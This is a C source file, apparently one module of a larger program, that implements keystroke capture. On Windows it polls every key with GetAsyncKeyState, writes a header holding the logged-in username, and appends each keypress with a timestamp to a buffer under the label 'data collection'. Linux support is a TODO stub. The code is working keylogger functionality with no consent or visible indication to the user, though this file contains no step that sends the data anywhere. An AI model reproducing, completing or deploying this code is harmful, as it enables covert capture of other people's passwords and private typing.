#include "../include/input.h"
#include "../include/config.h"
#include "../include/utils.h"

#include <assert.h>
#include <stdint.h>
#include <string.h>

#ifdef _WIN32
    #include <windows.h>
#else
    #include <unistd.h>
#endif

#ifndef _WIN32
    #include <sys/time.h>
struct input_event
{
    struct timeval time;
    uint16_t type;
    uint16_t code;
    int32_t value;
};
#endif

[[nodiscard]]
static bool is_any_key_pressed(char *key_pressed)
{
    assert(key_pressed != nullptr);

    if (!key_pressed)
    {
        LOG("Error: key_pressed buffer is nullptr");
        return false;
    }

#ifdef _WIN32
    for (int vKey = 8; vKey <= 254; ++vKey)
    {
        if (GetAsyncKeyState(vKey) & 0x8000)
        {
            UINT mapped = MapVirtualKeyA(vKey, MAPVK_VK_TO_CHAR);

            if (mapped > 0)
            {
                *key_pressed = (char)(mapped); // Virtual Key to ASCII
                sleep_ms(50);
                return true;
            }
        }
    }
    return false;

#else
    // TODO: Implement Linux key polling
    // Example: Read from /dev/input/eventX

    // *key_pressed = ...;
    // return true;
    return false;
#endif
}

void get_data(char *buffer, size_t max_size)
{
    assert(buffer != nullptr);
    assert(max_size == MAX_BUFFER_SIZE);

    if (!buffer || max_size != MAX_BUFFER_SIZE)
    {
        LOG("Error: Invalid buffer or size provided to get_data");
        return;
    }

    LOG("Initializing data collection loop (Max buffer: %zu)", max_size);

    char username_buffer[32];
    get_username(username_buffer, sizeof(username_buffer));

    int32_t header_len =
        snprintf(buffer, max_size, "---@%s---\n", username_buffer);

    if (header_len < 0 || (size_t)header_len >= max_size)
    {
        LOG("Error: Header generation failed or buffer too small");
        buffer[0] = '\0';
        return;
    }

    size_t current_size = (size_t)header_len;
    char key_pressed = 0;
    const size_t SAFETY_MARGIN = 64;

    LOG("Header written. Waiting for input...");

    while ((current_size + SAFETY_MARGIN) < max_size)
    {
        if (is_any_key_pressed(&key_pressed))
        {
            char time_buffer[32];
            get_time(time_buffer, sizeof(time_buffer));

            char line_buffer[64];

            int32_t len = snprintf(line_buffer, sizeof(line_buffer),
                                   "[%s]: '%c'\n", time_buffer, key_pressed);

            if (len > 0 && len < (int32_t)sizeof(line_buffer))
            {
                if (current_size + len < max_size)
                {
                    memcpy(buffer + current_size, line_buffer, len);
                    current_size += len;
                    buffer[current_size] = '\0';

                    LOG("Captured key '%c' at offset %zu", key_pressed,
                        current_size);
                }
                else
                {
                    LOG("Warning: Buffer full, stopping capture");
                    break;
                }
            }
            else
            {
                LOG("Error: Failed to format line buffer");
            }
        }

        sleep_ms(50);
    }

    LOG("Data collection finished. Total size: %zu", current_size);
}